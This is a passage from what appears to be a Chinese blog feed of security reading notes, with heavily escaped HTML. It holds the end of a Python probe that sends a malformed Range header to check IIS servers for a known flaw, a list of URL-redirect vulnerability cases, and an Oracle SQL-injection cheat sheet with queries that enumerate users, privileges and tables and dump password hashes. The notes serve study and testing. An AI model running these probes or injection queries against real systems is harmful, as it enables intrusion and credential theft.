class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;[-] please input IP, python &#39;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; sys&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39; 127.0.0.1 80 0&#39;&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; sys&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;()&lt;/span&gt;40.41. &lt;span class=&quot;pln&quot;&gt;ipAddr &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; sys&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;ipPort &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; int&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;req1 &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;GET / HTTP/1.0\r\n\r\n&quot;&lt;/span&gt;44.45.46. &lt;span class=&quot;kwd&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;[&amp;#42] Audit Started&quot;&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;client_socket &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; socket&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; socket&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;client_socket&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;ipAddr&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; ipPort&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;client_socket&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;req1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;boringResp &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; client_socket&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;com&quot;&gt;#print boringResp&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;pattern &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; re&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;compile&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39;Length:\s+\d+&#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;findall &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; pattern&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;findall&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;boringResp&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; findall&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; contentlength &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; int&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;findall&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&#39; &#39;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; int&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;])&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;==&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; lower &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; contentlength&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;kwd&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;[-] content-length fail!!&quot;&lt;/span&gt; &lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;Microsoft&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;not&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; boringResp&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;[&amp;#42] Not IIS&quot;&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; exit&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;client_socket&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;close&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;()&lt;/span&gt;64.65. &lt;span class=&quot;pln&quot;&gt;req &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;GET / HTTP/1.1\r\nHost: stuff\r\nRange: bytes=&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;lower&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)+&lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;-&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; \&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; hexAllFfff &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;\r\n\r\n&quot;&lt;/span&gt; &lt;span class=&quot;kwd&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;[-] \n&quot;&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;req&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;client_socket &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; socket&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; socket&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;client_socket&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;ipAddr&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; ipPort&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;client_socket&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;req&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt;goodResp &lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; client_socket&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;lit&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;com&quot;&gt;#print goodResp&lt;/span&gt;73.74. &lt;span class=&quot;kwd&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;Requested Range Not Satisfiable&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; goodResp&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;[!!] Looks VULN&quot;&lt;/span&gt; &lt;span class=&quot;kwd&quot;&gt;elif&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot; The request has an invalid header name&quot;&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; goodResp&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;[&amp;#42] Looks Patched&quot;&lt;/span&gt; &lt;span class=&quot;kwd&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;pun&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kwd&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;pln&quot;&gt; &lt;/span&gt;&lt;span class=&quot;str&quot;&gt;&quot;[&amp;#42] Unexpected response, cannot discern patch status&quot;&lt;/span&gt; 来自为知笔记(Wiz)]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[读《URL重定向/跳转漏洞》]]></title>
    <url>%2F2015%2F04%2F11%2F96913359a7d9fe881a0e6c520a7d2ded%2F</url>
    <content type="text"><![CDATA[0x03 实际案例 a&nbsp;WooYun: 百度一个URL跳转漏洞&nbsp;http://www.wooyun.org/bugs/wooyun-2010-0104 通过url跳转突破IM的安全校验，从而传播恶意URL b&nbsp;WooYun: 第五次遇到利用淘宝网网址跳转的网钓&nbsp;&nbsp;http://www.wooyun.org/bugs/wooyun-2010-0324 通过url跳转欺骗交易用户对URL的信任，从而实现欺诈 c http://hi.baidu.com/rayh4c/blog/item/8fde4b23ffa2045e9822edb9.html 通过URL跳转绕过应用程序对引用资源的限制，从而导致安全漏洞 d&nbsp;WooYun: 豆瓣电台认证绕过及csrf防范策略绕过漏洞&nbsp;&nbsp;http://www.wooyun.org/bugs/wooyun-2010-0198 借助未验证的URL跳转，可以将应用程序内部敏感的数据传递到不安全的第三方区域 &nbsp;来自为知笔记(Wiz)]]></content>
      <categories>
        <category>读书笔记</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[读《Hacking Oracle with Sql Injection》主要利用于：10gr2]]></title>
    <url>%2F2015%2F04%2F11%2F8b6fa0850f4e9ee9b55c1dc2e1197f7a%2F</url>
    <content type="text"><![CDATA[测试数据库版本：Oracle Database 10g Enterprise Edition Release 10.2.0.1.0&nbsp;Oracle Database 11g Enterprise Edition Release 11.2.0.1.0oracle 注入 信息刺探： -- list version&amp;nbsp;&amp;nbsp; select banner from v$version where rownum=1 ;&amp;nbsp;`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- oracle version`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- list user&amp;nbsp;&amp;nbsp; select user from dual;&amp;nbsp;`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- current user&amp;nbsp;&amp;nbsp; select username from user_users;&amp;nbsp;`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- current user&amp;nbsp;&amp;nbsp; select username from all_users;&amp;nbsp;`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- all user , the current user can see...&amp;nbsp;&amp;nbsp; select username from dba_users;&amp;nbsp;`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- all user , need pris -- list role&amp;nbsp;&amp;nbsp; select role from session_roles;&amp;nbsp;`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- current role`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;` -- list privs&amp;nbsp;&amp;nbsp; select privilege from user_sys_privs;&amp;nbsp;`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- privs the current user has&amp;nbsp;&amp;nbsp; select privilege from role_sys_privs;&amp;nbsp;`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- privs the current role has&amp;nbsp;&amp;nbsp; select privilege from session_privs;&amp;nbsp;`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- the all privs that current user has = user_sys_privs + role_sys_privs&amp;nbsp;&amp;nbsp; select &amp;#42 from dba_sys_privs;&amp;nbsp;`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- all user&apos;s privs , need privs`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;` -- list password hash&amp;nbsp;&amp;nbsp; select name, password, astatus from sys.user$;&amp;nbsp;`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- password hash &amp;lt;=10g , need privs&amp;nbsp;&amp;nbsp; select name, password, spare4 from sys.user$;&amp;nbsp;`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- password has 11g , need privs -- list database&amp;nbsp;&amp;nbsp; select global_name from global_name;&amp;nbsp;`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- current database&amp;nbsp;&amp;nbsp; select sys.database_name from dual;&amp;nbsp;`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- current database&amp;nbsp;&amp;nbsp; select name from v$database;&amp;nbsp;`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- current database name , need privs&amp;nbsp;&amp;nbsp; select instance_name from v$instance;&amp;nbsp;`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- current database name , need privs `&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- list schemas&amp;nbsp;&amp;nbsp; select distinct owner from all_tables;&amp;nbsp;`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- all schema`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;` -- list tables&amp;nbsp;&amp;nbsp; select table_name from all_tables where owner=&apos;xxx&apos;;&amp;nbsp;`&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;&lt;span style=&quot;font-size: 10.5pt;&quot;&gt;-- all table name&lt;/span&gt;&lt;/pre&gt;&lt;pre style=&quot;margin-top: 0px; margin-bottom: 8px; padding: 8px 16px; font-family: &apos;Courier New&apos;, Courier, monospace; white-space: pre-wrap; word-wrap: break-word; border: 1px solid rgb(221, 221, 221); color: rgb(51, 51, 51); line-height: 24px; background-color: rgb(248, 248, 248); background-position: initial initial; background-repeat: initial initial;&quot;&gt;`-- list columns&amp;nbsp;&amp;nbsp; select owner,table_name,column_name from all_tab_columns where table_name=&apos;xxx&apos;;&amp;nbsp;&amp;nbsp; select owner,table_name,column_name from all_tab_cols where table_name=&apos;xxx&apos;;`&lt;/pre&gt;&lt;div style=&quot;color:gray&quot;&gt; &lt;/div&gt;&lt;small&gt;&lt;small&gt;&amp;nbsp;&lt;/small&gt;&lt;/small&gt;&lt;span style=&quot;background-color: rgb(255, 255, 255); color: 